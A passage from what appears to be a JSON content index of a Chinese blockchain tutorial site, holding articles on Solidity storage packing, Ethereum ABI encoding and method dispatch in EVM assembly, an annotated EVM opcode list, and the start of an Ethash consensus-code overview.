0x3333;\n    }\n}\n再一次，这里有4个64位的数值我们希望能打包成一个32位的数值，只使用一个sstore指令。\n编译的汇编代码太长了，我们就数数sstore和sload指令的条数：\n$ solc --bin --asm --optimize c-static-array--packing.sol | grep -E &#039;(sstore|sload)&#039;\n  sload\n  sstore\n  sload\n  sstore\n  sload\n  sstore\n  sload\n  sstore\n哦，不！即使定长数组与等效的结构体和存储变量的存储布局是一样的，优化也失败了。现在需要4对sload和sstore指令。\n快速的看一下汇编代码，可以发现每个数组的访问都有一个边界检查代码，它们在不同的标签下被组织起来。优化无法跨标签，所以优化失败。\n不过有个小安慰。其他额外的3个sstore指令比第一个要便宜：\n\nsstore指令第一次写入一个新位置需要花费 20000 gas\nsstore指令后续写入一个已存在的位置需要花费 5000 gas\n\n所以这个特殊的优化失败会花费我们35000 gas而不是20000 gas，多了额外的75%。\n总结\n如果Solidity编译器能弄清楚存储变量的大小，它就会将这些变量依次的放入存储器中。如果可能的话，编译器会将数据紧密的打包成32字节的块。\n总结一下目前我们见到的打包行为：\n\n存储变量：打包\n结构体：打包\n定长数组：不打包。在理论上应该是打包的\n\n因为存储器访问的成本较高，所以你应该将存储变量作为自己的数据库模式。当写一个合约时，做一个小实验是比较有用的，检测汇编代码看看编译器是否进行了正确的优化。\n我们可以肯定Solidity编译器在未来肯定会改良。对于现在而言，很不幸，我们不能盲目的相信它的优化器。\n它需要你真正的理解存储变量。"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM如何调用ABI编码的外部方法-22":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM如何调用ABI编码的外部方法-22","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM如何调用ABI编码的外部方法-22.md","title":"死磕以太坊源码分析之EVM如何调用ABI编码的外部方法-22","links":[],"tags":[],"content":"\n死磕以太坊源码分析之EVM如何调用ABI编码的外部方法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\n前言\nabi是什么？\n前面我们认识到的是智能合约直接在EVM上的表示方式，但是，比如我想用java端程序去访问智能合约的某个方法，难道让java开发人员琢磨透汇编和二进制的表示，再去对接？\n这明显是不可能的，为此abi产生了。这是一个通用可读的json格式的数据，任何别的客户端开发人员或者别的以太坊节点只要指定要调用的方法，通过abi将其解析为字节码并传递给evm，evm来计算处理该字节码并返回结果给前端。abi就起到这么一个作用，类似于传统的客户端和服务器端地址好交互规则，比如json格式的数据，然后进行交互。\n在本系列的上一篇文章中我们看到了Solidity是如何在EVM存储器中表示复杂数据结构的。但是如果无法交互，数据就是没有意义的。智能合约就是数据和外界的中间体。\n在这篇文章中我们将会看到Solidity和EVM可以让外部程序来调用合约的方法并改变它的状态。\n“外部程序”不限于DApp/JavaScript。任何可以使用HTTP RPC与以太坊节点通信的程序，都可以通过创建一个交易与部署在区块链上的任何合约进行交互。\n创建一个交易就像发送一个HTTP请求。Web的服务器会接收你的HTTP请求，然后改变数据库。交易会被网络接收，底层的区块链会扩展到包含改变的状态。\n交易对于智能合约就像HTTP请求对于Web服务器。\n合约交易\n让我们来看一下将状态变量设置在0x1位置上的交易。我们想要交互的合约有一个对变量a的设置者和获取者：\npragma solidity ^0.4.11;\ncontract C {\n  uint256 a;\n  function setA(uint256 _a) {\n    a = _a;\n  }\n  function getA() returns(uint256) {\n    return a;\n  }\n}\n这个合约部署在Rinkeby测试网上。可以随意使用Etherscan，并搜索地址 0x62650ae5…进行查看。\n我创建了一个可以调用setA(1)的交易，可以在地址0x7db471e5…上查看该交易。\n交易的input data是：\n\n0xee919d500000000000000000000000000000000000000000000000000000000000000001\n\n对于EVM而言，这只是36字节的元数据。它对元数据不会进行处理，会直接将元数据作为calldata传递给智能合约。如果智能合约是个Solidity程序，那么它会将这些输入字节解释为方法调用，并为setA(1)执行适当的汇编代码。\n输入数据可以分成两个子部分：\n# 方法选择器(4字节)\n0xee919d5\n#第一个参数(32字节)\n00000000000000000000000000000000000000000000000000000000000000001\n前面的4个字节是方法选择器，剩下的输入数据是方法的参数，32个字节的块。在这个例子中，只有一个参数，值是0x1。\n方法选择器是方法签名的 kecccak256 哈希值。在这个例子中方法的签名是setA(uint256)，也就是方法名称和参数的类型。\n让我们用Python来计算方法选择器。首先，哈希方法签名：\n \n# 安装pyethereum [github.com/ethereum/pyethereum/#installation](github.com/ethereum/pyethereum/#installation)&gt; from ethereum.utils import sha3&gt; sha3(&quot;setA(uint256)&quot;).hex()&#039;ee919d50445cd9f463621849366a537968fe1ce096894b0d0c001528383d4769&#039;\n然后获取哈希值的前4字节：\n&gt; sha3(&quot;setA(uint256)&quot;)[0:4].hex()\n&#039;ee919d50&#039;\n应用二进制接口（ABI）\n对于EVM而言，交易的输入数据(calldata)只是一个字节序列。EVM内部不支持调用方法。\n智能合约可以选择通过以结构化的方式处理输入数据来模拟方法调用，就像前面所说的那样。\n如果EVM上的所有语言都同意相同的方式解释输入数据，那么它们就可以很容易进行交互。 合约应用二进制接口（ABI）指定了一个通用的编码模式。\n我们已经看到了ABI是如何编码一个简单的方法调用，例如SetA(1)。在后面章节中我们将会看到方法调用和更复杂的参数是如何编码的。\n调用一个获取者\n如果你调用的方法改变了状态，那么整个网络必须要同意。这就需要有交易，并消耗gas。\n一个获取者如getA()不会改变任何东西。我们可以将方法调用发送到本地的以太坊节点，而不用请求整个网络来执行计算。一个eth_callRPC请求可以允许你在本地模拟交易。这对于只读方法或gas使用评估比较有帮助。\n一个eth_call就像一个缓存的HTTP GET请求。\n\n它不改变全球的共识状态\n本地区块链(“缓存”)可能会有点稍微过时\n\n制作一个eth_call来调用 getA方法，通过返回值来获取状态a。首先，计算方法选择器：\n&gt;&gt;&gt; sha3(&quot;getA()&quot;)[0:4].hex()\n&#039;d46300fd&#039;\n由于没有参数，输入数据就只有方法选择器了。我们可以发送一个eth_call请求给任意的以太坊节点。对于这个例子，我们依然将请求发送给 infura.io的公共以太坊节点：\n$ curl -X POST \\-H &quot;Content-Type: application/json&quot; \\&quot;[rinkeby.infura.io/YOUR_INFURA_TOKEN](rinkeby.infura.io/YOUR_INFURA_TOKEN)&quot; \\--data &#039;{&quot;jsonrpc&quot;: &quot;2.0&quot;,&quot;id&quot;: 1,&quot;method&quot;: &quot;eth_call&quot;,&quot;params&quot;: [{&quot;to&quot;: &quot;0x62650ae5c5777d1660cc17fcd4f48f6a66b9a4c2&quot;,&quot;data&quot;: &quot;0xd46300fd&quot;},&quot;latest&quot;]}&#039;\n根据ABI，该字节应该会解释为0x1数值。\n外部方法调用的汇编\n现在来看看编译的合约是如何处理源输入数据的，并以此来制作一个方法调用。思考一个定义了setA(uint256)的合约：\npragma solidity ^0.4.11;\ncontract C {\n  uint256 a;\n  // 注意: `payable` 让汇编简单一点点\n  function setA(uint256 _a) payable {\n    a = _a;\n  }\n}\n编译：\nsolc --bin --asm --optimize call.sol\n调用方法的汇编代码在合约内部，在sub_0标签下：\nsub_0: assembly {\n    mstore(0x40, 0x60)\n    and(div(calldataload(0x0), 0x100000000000000000000000000000000000000000000000000000000), 0xffffffff)\n    0xee919d50\n    dup2\n    eq\n    tag_2\n    jumpi\n  tag_1:\n    0x0\n    dup1\n    revert\n  tag_2:\n    tag_3\n    calldataload(0x4)\n    jump(tag_4)\n  tag_3:\n    stop\n  tag_4:\n      /* &quot;call.sol&quot;:95:96  a */\n    0x0\n      /* &quot;call.sol&quot;:95:101  a = _a */\n    dup2\n    swap1\n    sstore\n  tag_5:\n    pop\n    jump // 跳出\nauxdata: 0xa165627a7a7230582016353b5ec133c89560dea787de20e25e96284d67a632e9df74dd981cc4db7a0a0029\n}\n这里有两个样板代码与此讨论是无关的，但是仅供参考：\n\n最上面的mstore(0x40, 0x60)为sha3哈希保留了内存中的前64个字节。不管合约是否需要，这个都会存在的。\n最下面的auxdata用来验证发布的源码与部署的字节码是否相同的。这个是可选择的，但是嵌入到了编译器中\n\n将剩下的汇编代码分成两个部分，这样容易分析一点：\n\n匹配选择器并跳掉方法处\n加载参数、执行方法，并从方法返回\n\n首先，匹配选择器的注释汇编代码：\n// 加载前4个字节作为方法选择器\nand(div(calldataload(0x0), 0x100000000000000000000000000000000000000000000000000000000), 0xffffffff)\n//  如果选择器匹配`0xee919d50`, 跳转到 setA\n0xee919d50\ndup2\neq\ntag_2\njumpi\n// 匹配失败，返回并还原\ntag_1:\n  0x0\n  dup1\n  revert\n// setA函数\ntag_2:\n  ...\n除了开始从调用数据里面加载4字节时的位转移，其他的都是非常清晰明朗的。为了清晰可见，给出了汇编逻辑的低级伪代码：\nmethodSelector = calldata[0:4]\nif methodSelector == &quot;0xee919d50&quot;:\n  goto tag_2 // 跳转到setA\nelse:\n  // 匹配失败，返回并还原\n  revert\n实际方法调用的注释汇编代码：\n// setA\ntag_2:\n  // 方法调用之后跳转的地方\n  tag_3\n  // 加载第一个参数(数值0x1).\n  calldataload(0x4)\n  // 执行方法\n  jump(tag_4)\ntag_4:\n  // sstore(0x0, 0x1)\n  0x0\n  dup2\n  swap1\n  sstore\ntag_5:\n  pop\n  //程序的结尾，将会跳转到 tag_3并停止\n  jump\ntag_3:\n  // 程序结尾\n  stop\n在进入方法体之前，汇编代码做了两件事情：\n\n保存了一个位置，方法调用之后返回此位置\n从调用数据里面加载参数到栈中\n\n低级的伪代码：\n// 保存位置，方法调用结束后返回此位置\n@returnTo = tag_3\ntag_2: // setA\n  // 从调用数据里面加载参数到栈中\n  @arg1 = calldata[4:4+32]\ntag_4: // a = _a\n  sstore(0x0, @arg1)\ntag_5 // 返回\n  jump(@returnTo)\ntag_3:\n  stop\n将这两部分组合起来：\nmethodSelector = calldata[0:4]\nif methodSelector == &quot;0xee919d50&quot;:\n  goto tag_2 // goto setA\nelse:\n  // 无匹配方法。失败\n  revert\n@returnTo = tag_3\ntag_2: // setA(uint256 _a)\n  @arg1 = calldata[4:36]\ntag_4: // a = _a\n  sstore(0x0, @arg1)\ntag_5 // 返回\n  jump(@returnTo)\ntag_3:\n  stop\n\n有趣的小细节：revert的操作码是fd。但是在黄皮书中你不会找到它的详细说明，或者在代码中找到它的实现。实际上，fd不是确实存在的！这是个无效的操作。当EVM遇到了一个无效的操作，它会放弃并且会有还原状态的副作用。\n\n处理多个方法\nSolidity编译器是如何为有多个方法的合约产生汇编代码的？\npragma solidity ^0.4.11;\ncontract C {\n    uint256 a;\n    uint256 b;\n    function setA(uint256 _a) {\n      a = _a;\n    }\n    function setB(uint256 _b) {\n      b = _b;\n    }\n}\n简单，只要一些if-else分支就可以了：\n// methodSelector = calldata[0:4]\nand(div(calldataload(0x0), 0x100000000000000000000000000000000000000000000000000000000), 0xffffffff)\n// if methodSelector == 0x9cdcf9b\n0x9cdcf9b\ndup2\neq\ntag_2 // SetB\njumpi\n// elsif methodSelector == 0xee919d50\ndup1\n0xee919d50\neq\ntag_3 // SetA\njumpi\n伪代码：\nmethodSelector = calldata[0:4]\nif methodSelector == &quot;0x9cdcf9b&quot;:\n  goto tag_2\nelsif methodSelector == &quot;0xee919d50&quot;:\n  goto tag_3\nelse:\n  // Cannot find a matching method. Fail.\n  revert\nABI为复杂方法调用进行编码\n对于一个方法调用，交易输入数据的前4个字节总是方法选择器。跟在后面的32字节块就是方法参数。 ABI编码规范显示了更加复杂的参数类型是如何被编码的，但是阅读起来非常的痛苦。\n另一个学习ABI编码的方式是使用 pyethereum的ABI编码函数 来研究不同数据类型是如何编码的。我们会从简单的例子开始，然后建立更复杂的类型。\n首先，导出encode_abi函数：\nfrom ethereum.abi import encode_abi\n对于一个有3个uint256类型参数的方法（例如foo(uint256 a, uint256 b, uint256 c)），编码参数只是简单的依次对uint256数值进行编码：\n# 第一个数组列出了参数的类型\n# 第二个数组列出了参数的值\n&gt; encode_abi([&quot;uint256&quot;, &quot;uint256&quot;, &quot;uint256&quot;],[1, 2, 3]).hex()\n0000000000000000000000000000000000000000000000000000000000000001\n0000000000000000000000000000000000000000000000000000000000000002\n0000000000000000000000000000000000000000000000000000000000000003\n \n小于32字节的类型会被填充到32字节：\n&gt; encode_abi([&quot;int8&quot;, &quot;uint32&quot;, &quot;uint64&quot;],[1, 2, 3]).hex()\n0000000000000000000000000000000000000000000000000000000000000001\n0000000000000000000000000000000000000000000000000000000000000002\n0000000000000000000000000000000000000000000000000000000000000003\n对于定长数组，元素还是32字节的块（如果必要的话会填充0），依次排列：\n&gt; encode_abi(\n   [&quot;int8[3]&quot;, &quot;int256[3]&quot;],\n   [[1, 2, 3], [4, 5, 6]]\n).hex()\n// int8[3]. Zero-padded to 32 bytes.\n0000000000000000000000000000000000000000000000000000000000000001\n0000000000000000000000000000000000000000000000000000000000000002\n0000000000000000000000000000000000000000000000000000000000000003\n// int256[3].\n0000000000000000000000000000000000000000000000000000000000000004\n0000000000000000000000000000000000000000000000000000000000000005\n0000000000000000000000000000000000000000000000000000000000000006\nABI为动态数组编码\nABI介绍了一种间接的编码动态数组的方法，遵循一个叫做头尾编码的模式。\n该模式其实就是动态数组的元素被打包到交易的调用数据尾部，参数(“头”)会被引用到调用数据里，这里就是数组元素。\n如果我们调用的方法有3个动态数组，参数的编码就会像这样（添加注释和换行为了更加的清晰）：\n&gt; encode_abi(\n  [&quot;uint256[]&quot;, &quot;uint256[]&quot;, &quot;uint256[]&quot;],\n  [[0xa1, 0xa2, 0xa3], [0xb1, 0xb2, 0xb3], [0xc1, 0xc2, 0xc3]]\n).hex()\n/************* HEAD (32*3 bytes) *************/\n// 参数1: 数组数据在0x60位置\n0000000000000000000000000000000000000000000000000000000000000060\n// 参数2：数组数据在0xe0位置\n00000000000000000000000000000000000000000000000000000000000000e0\n// 参数3： 数组数据在0x160位置 \n0000000000000000000000000000000000000000000000000000000000000160\n/************* TAIL (128**3 bytes) *************/\n//  0x60位置。参数1的数据\n// 长度后跟这元素\n0000000000000000000000000000000000000000000000000000000000000003\n00000000000000000000000000000000000000000000000000000000000000a1\n00000000000000000000000000000000000000000000000000000000000000a2\n00000000000000000000000000000000000000000000000000000000000000a3\n// 0xe0位置。参数2的数据\n0000000000000000000000000000000000000000000000000000000000000003\n00000000000000000000000000000000000000000000000000000000000000b1\n00000000000000000000000000000000000000000000000000000000000000b2\n00000000000000000000000000000000000000000000000000000000000000b3\n//0x160位置。参数3的数据\n0000000000000000000000000000000000000000000000000000000000000003\n00000000000000000000000000000000000000000000000000000000000000c1\n00000000000000000000000000000000000000000000000000000000000000c2\n00000000000000000000000000000000000000000000000000000000000000c3\nHEAD部分有32字节参数，指出TAIL部分的位置，TAIL部分包含了3个动态数组的实际数据。\n举个例子，第一个参数是0x60，指出调用数据的第96个(0x60)字节。如果你看一下第96个字节，它是数组的开始地方。前32字节是长度，后面跟着的是3个元素。\n混合动态和静态参数是可能的。这里有个(static，dynamic，static)参数。静态参数按原样编码，而第二个动态数组的数据放到了尾部：\n&gt; encode_abi(\n  [&quot;uint256&quot;, &quot;uint256[]&quot;, &quot;uint256&quot;],\n  [0xaaaa, [0xb1, 0xb2, 0xb3], 0xbbbb]\n).hex()\n/************* HEAD (32*3 bytes) *************/\n// 参数1： 0xaaaa\n000000000000000000000000000000000000000000000000000000000000aaaa\n// 参数2：数组数据在0x60位置\n0000000000000000000000000000000000000000000000000000000000000060\n// 参数3： 0xbbbb\n000000000000000000000000000000000000000000000000000000000000bbbb\n/************* TAIL (128 bytes) *************/\n// 0x60位置。参数2的数据\n0000000000000000000000000000000000000000000000000000000000000003\n00000000000000000000000000000000000000000000000000000000000000b1\n00000000000000000000000000000000000000000000000000000000000000b2\n00000000000000000000000000000000000000000000000000000000000000b3\n编码字节数组\n字符串和字节数组同样是头尾编码。唯一的区别是字节数组会被紧密的打包成一个32字节的块，就像：\n&gt; encode_abi(\n  [&quot;string&quot;, &quot;string&quot;, &quot;string&quot;],\n  [&quot;aaaa&quot;, &quot;bbbb&quot;, &quot;cccc&quot;]\n).hex()\n// 参数1： 字符串数据在0x60位置\n0000000000000000000000000000000000000000000000000000000000000060\n// 参数2：字符串数据在0xa0位置\n00000000000000000000000000000000000000000000000000000000000000a0\n// 参数3：字符串数据在0xe0位置\n00000000000000000000000000000000000000000000000000000000000000e0\n// 0x60 (96)。 参数1的数据\n0000000000000000000000000000000000000000000000000000000000000004\n6161616100000000000000000000000000000000000000000000000000000000\n// 0xa0 (160)。参数2的数据\n0000000000000000000000000000000000000000000000000000000000000004\n6262626200000000000000000000000000000000000000000000000000000000\n// 0xe0 (224)。参数3的数据\n0000000000000000000000000000000000000000000000000000000000000004\n6363636300000000000000000000000000000000000000000000000000000000\n对于每个字符串/字节数组，前面的32字节是编码长度，后面跟着才是字符串/字节数组的内容。\n如果字符串大于32字节，那么多个32字节块就会被使用：\n// 编码字符串的48字节\nethereum.abi.encode_abi(\n  [&quot;string&quot;],\n  [&quot;a&quot; * (32+16)]\n).hex()\n \n0000000000000000000000000000000000000000000000000000000000000020\n//字符串的长度为0x30 (48)\n0000000000000000000000000000000000000000000000000000000000000030\n6161616161616161616161616161616161616161616161616161616161616161\n6161616161616161616161616161616100000000000000000000000000000000\n \n嵌套数组\n嵌套数组中每个嵌套有一个间接寻址。\n&gt; encode_abi(\n  [&quot;uint256[][]&quot;],\n  [[[0xa1, 0xa2, 0xa3], [0xb1, 0xb2, 0xb3], [0xc1, 0xc2, 0xc3]]]\n).hex()\n//参数1：外层数组在0x20位置上\n0000000000000000000000000000000000000000000000000000000000000020\n// 0x20。每个元素都是里层数组的位置\n0000000000000000000000000000000000000000000000000000000000000003\n0000000000000000000000000000000000000000000000000000000000000060\n00000000000000000000000000000000000000000000000000000000000000e0\n0000000000000000000000000000000000000000000000000000000000000160\n// array[0]在0x60位置上\n0000000000000000000000000000000000000000000000000000000000000003\n00000000000000000000000000000000000000000000000000000000000000a1\n00000000000000000000000000000000000000000000000000000000000000a2\n00000000000000000000000000000000000000000000000000000000000000a3\n// array[1] 在0xe0位置上\n0000000000000000000000000000000000000000000000000000000000000003\n00000000000000000000000000000000000000000000000000000000000000b1\n00000000000000000000000000000000000000000000000000000000000000b2\n00000000000000000000000000000000000000000000000000000000000000b3\n// array[2]在0x160位置上\n0000000000000000000000000000000000000000000000000000000000000003\n00000000000000000000000000000000000000000000000000000000000000c1\n00000000000000000000000000000000000000000000000000000000000000c2\n00000000000000000000000000000000000000000000000000000000000000c3\nGas成本和ABI编码设计\n为什么ABI将方法选择器截断到4个字节？如果我们不使用sha256的整个32字节，会不会不幸的碰到不同方法发生冲突的情况？ 如果这个截断是为了节省成本，那么为什么在用更多的0来进行填充时，而仅仅只为了节省方法选择器中的28字节而截断呢？\n这种设计看起来互相矛盾……直到我们考虑到一个交易的gas成本。\n\n每笔交易需要支付 21000 gas\n每笔交易的0字节或代码需要支付 4 gas\n每笔交易的非0字节或代码需要支付 68 gas\n\n啊哈！0要便宜17倍，0填充现在看起来没有那么不合理了。\n方法选择器是一个加密哈希值，是个伪随机。一个随机的字符串倾向于拥有很多的非0字节，因为每个字节只有0.3%（1/255）的概率是0。\n\n0x1填充到32字节成本是192 gas\n4*31 (0字节) + 68 (1个非0字节)\nsha256可能有32个非0字节，成本大概2176 gas\n32 * 68\nsha256截断到4字节，成本大概272 gas\n32*4\n\nABI展示了另外一个底层设计的奇特例子，通过gas成本结构进行激励。\n\n负整数….\n\n一般使用叫做 补码的方式来表达负整数。int8类型-1的数值编码会都是1。1111 1111。\nABI用1来填充负整数，所以-1会被填充为：\nffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n越大的负整数（-1大于-2）1越多，会花费相当多的gas。\n总结\n与智能合约交互，你需要发送原始字节。它会进行一些计算，可能会改变自己的状态，然后会返回给你原始字节。方法调用实际上不存在，这是ABI创造的集体假象。\nABI被指定为一个低级格式，但是在功能上更像一个跨语言RPC框架的序列化格式。\n我们可以在DApp和Web App的架构层面之间进行类比：\n\n区块链就是一个备份数据库\n合约就像web服务器\n交易就像请求\nABI是数据交换格式，就像Protocol Buffer。\n\n\n翻译自 medium.com/@hayeah/diving-into-the-ethereum-vm-part-2-storage-layout-bc5349cb11b7\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM指令集-19":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM指令集-19","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EVM指令集-19.md","title":"死磕以太坊源码分析之EVM指令集-19","links":[],"tags":[],"content":"\n死磕以太坊源码分析之EVM指令集\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n以下指令集持续更新，最新文章请参考上面\n\n\nEVM 指令集概念\nEVM执行的是字节码。由于操作码被限制在一个字节以内，所以EVM指令集最多只能容纳256条指令。目前EVM已经定义了100多条指令，还有100多条指令可供以后扩展。这100多条指令包括算术运算指令，比较操作指令，按位运算指令，密码学计算指令，栈、memory、storage操作指令，跳转指令，区块、智能合约相关指令等。\nEVM指令集\n算数运算指令集\n\n0x0\n\n\tSTOP:       &quot;STOP&quot;,\n\tADD:        &quot;ADD&quot;, //加法运算\n\tMUL:        &quot;MUL&quot;, //乘法运算\n\tSUB:        &quot;SUB&quot;, //减法运算\n\tDIV:        &quot;DIV&quot;, //无符号整除运算\n\tSDIV:       &quot;SDIV&quot;, //有符号整除运算\n\tMOD:        &quot;MOD&quot;, //无符号取模运算\n\tSMOD:       &quot;SMOD&quot;, //有符号取模运算\n\tEXP:        &quot;EXP&quot;,  //指数运算\n\tNOT:        &quot;NOT&quot;,\n\t\n\t//从栈顶弹出两个元素，进行比较，\n\t//然后把结果（1表示true，0表示false）推入栈顶。\n\t//其中LT和GT把弹出的元素解释为无符号整数进行比较，\n\t//SLT和SGT把弹出的元素解释为有符号数进行比较，EQ不关心符号\n\tLT:         &quot;LT&quot;,  //无符号小于比较\n\tGT:         &quot;GT&quot;, //无符号大于比较\n\tSLT:        &quot;SLT&quot;, //有符号小于比较\n\tSGT:        &quot;SGT&quot;, //有符号大于比较\n\tEQ:         &quot;EQ&quot;,  // 等于比较\n\t\n\t//SZERO指令从栈顶弹出一个元素，判断它是否为0，如果是，则把1推入栈顶，否则把0推入栈顶\n\tISZERO:     &quot;ISZERO&quot;, //布尔取反\n\t\n\t//SIGNEXTEND指令从栈顶依次弹出k和x，并\n\t//把x解释为k+1（0 &lt;= k &lt;= 31）字节有符号整数，然\n\t//后把x符号扩展至32字节。比如x是二进制10000000，k是0，\n\t//则符号扩展之后，结果为二进制1111…10000000（共249个1）\n\tSIGNEXTEND: &quot;SIGNEXTEND&quot; //符号位扩展\n\n位运算指令集\n\n0x10\n\n\t//AND、OR、XOR指令从栈顶弹出两个元素，进行按位运算，然后把结果推入栈顶\n\tAND:    &quot;AND&quot;,\n\tOR:     &quot;OR&quot;,\n\tXOR:    &quot;XOR&quot;,\n\t\n\t//BYTE指令先后从栈顶弹出n和x，取x的第n个字节并推入栈顶。\n\t//由于EVM的字长是32个字节，所以n在[0, 31]区间内才有意义，\n\t//否则BYTE的运算结果就是0。另外，字节是从左到右数的，因此第0个字节占据字的最高位8个比特\n\tBYTE:   &quot;BYTE&quot;, \n\t\n\t//这三条指令都是先后从栈顶弹出两个数n和x，\n\t//其中x是要进行位移操作顶数，n是位移比特数，然后把结果推入栈顶\n\tSHL:    &quot;SHL&quot;,\n\t//SHR和SAR的区别在于，前者执行逻辑右移（空缺补0），后者执行算术右移（空缺补符号位）\n\tSHR:    &quot;SHR&quot;,\n\tSAR:    &quot;SAR&quot;,\n\t\n\tADDMOD: &quot;ADDMOD&quot;,\n\t\n\t//MULMOD指令依次从栈顶弹出x、y、z三个数，\n\t//先计算x和y的乘积（不受溢出限制），再计算乘积和z的模，最后把结果推入栈顶\n\t//假定乘积不会溢出，那么MULMOD(x, y, z)等价于x * y % z\n\tMULMOD: &quot;MULMOD&quot;,\n\n加密指令集\n\n0x20\n\nSHA3: &quot;SHA3&quot;\n\n关闭状态指令集\n\n0x30\n\n   ADDRESS:        &quot;ADDRESS&quot;,\n\tBALANCE:        &quot;BALANCE&quot;,\n\tORIGIN:         &quot;ORIGIN&quot;,\n\tCALLER:         &quot;CALLER&quot;,\n\tCALLVALUE:      &quot;CALLVALUE&quot;,\n\tCALLDATALOAD:   &quot;CALLDATALOAD&quot;,\n\tCALLDATASIZE:   &quot;CALLDATASIZE&quot;,\n\tCALLDATACOPY:   &quot;CALLDATACOPY&quot;,\n\tCODESIZE:       &quot;CODESIZE&quot;,\n\tCODECOPY:       &quot;CODECOPY&quot;,\n\tGASPRICE:       &quot;GASPRICE&quot;,\n\tEXTCODESIZE:    &quot;EXTCODESIZE&quot;,\n\tEXTCODECOPY:    &quot;EXTCODECOPY&quot;,\n\tRETURNDATASIZE: &quot;RETURNDATASIZE&quot;,\n\tRETURNDATACOPY: &quot;RETURNDATACOPY&quot;,\n\tEXTCODEHASH:    &quot;EXTCODEHASH&quot;,\n\n块操作指令集\n\n0x40\n\n\tBLOCKHASH:   &quot;BLOCKHASH&quot;,\n\tCOINBASE:    &quot;COINBASE&quot;,\n\tTIMESTAMP:   &quot;TIMESTAMP&quot;,\n\tNUMBER:      &quot;NUMBER&quot;,\n\tDIFFICULTY:  &quot;DIFFICULTY&quot;,\n\tGASLIMIT:    &quot;GASLIMIT&quot;,\n\tCHAINID:     &quot;CHAINID&quot;,\n\tSELFBALANCE: &quot;SELFBALANCE&quot;\n\n存储和执行指令集\n\n0x50\n\n\tPOP: &quot;POP&quot;,  // 栈顶弹出元素\n\tMLOAD:    &quot;MLOAD&quot;,\n\tMSTORE:   &quot;MSTORE&quot;,\n\tMSTORE8:  &quot;MSTORE8&quot;,\n\tSLOAD:    &quot;SLOAD&quot;, //先取出栈顶元素x，然后在storage中取以x为键的值（storage[x]）存入栈顶\n\tSSTORE:   &quot;SSTORE&quot;, //存储storage是一个键值存储，可将256位字映射到256位字\n\tJUMP:     &quot;JUMP&quot;,\n\tJUMPI:    &quot;JUMPI&quot;,\n\tPC:       &quot;PC&quot;,\n\tMSIZE:    &quot;MSIZE&quot;,\n\tGAS:      &quot;GAS&quot;,\n\tJUMPDEST: &quot;JUMPDEST&quot;\n\nPush指令集\n\n0x60\n\n\t// PUSH系列指令把紧跟在指令后面的N（1 ～ 32）字节元素推入栈顶\n\tPUSH1:  &quot;PUSH1&quot;,\n\t...\n\tPUSH32: &quot;PUSH32&quot;,\n\n    //DUP系列指令复制从栈顶开始数的第N（1 ～ 16）个元素，并把复制后的元素推入栈顶\n\tDUP1:  &quot;DUP1&quot;,\n\tDUP2:  &quot;DUP2&quot;,\n\t...\n\tDUP16: &quot;DUP16&quot;,\n\n\t//SWAP系列指令把栈顶元素和从栈顶开始数的第N（1 ～ 16）+ 1 个元素进行交换。\n\tSWAP1:  &quot;SWAP1&quot;,\n\t...\n\tSWAP16: &quot;SWAP16&quot;,\n\t\n\tLOG0:   &quot;LOG0&quot;,\n\t...\n\tLOG4:   &quot;LOG4&quot;,\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EthDB-17":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EthDB-17","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之EthDB-17.md","title":"死磕以太坊源码分析之EthDB-17","links":[],"tags":[],"content":"\n死磕以太坊源码分析之EthDB\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n目录结构\n|-leveldb.go\n|-memorydb.go\n|-batch.go\n|-database.go\n\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide\nwww.jianshu.com/nb/9496943 （levelDB源码）\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之Ethash共识算法-9":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之Ethash共识算法-9","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之Ethash共识算法-9.md","title":"死磕以太坊源码分析之Ethash共识算法-9","links":[],"tags":[],"content":"\n死磕以太坊源码分析之Ethash共识算法\n代码分支：github.com/ethereum/go-ethereum/tree/v1.9.9\n\n引言\n目前以太坊中有两个共识算法的实现：clique和ethash。而ethash是目前以太坊主网（Homestead版本）的POW共识算法。\n目录结构\nethash模块位于以太坊项目目录下的consensus/ethash目录下。\n\nalgorithm.go\n实现了Dagger-Hashimoto算法的所有功能，比如生成cache和dataset、根据Header和Nonce计算挖矿哈希等。\napi.go\n实现了供RPC使用的api方法。\nconsensus.go\n实现了以太坊共识接口的部分方法，包括Verify系列方法（VerifyHeader、VerifySeal等）、Prepare和Finalize、CalcDifficulty、Author、SealHash。\nethash.go\n实现了cache结构体和dataset结构体及它们各自的方法、MakeCache/MakeDataset函数、Ethash对象的New函数，和Ethash的内部方法。\nsealer.go\n实现了共识接口的Seal方法，和Ethash的内部方法mine。这些方法实现了ethash的挖矿功能。\n\nEthash 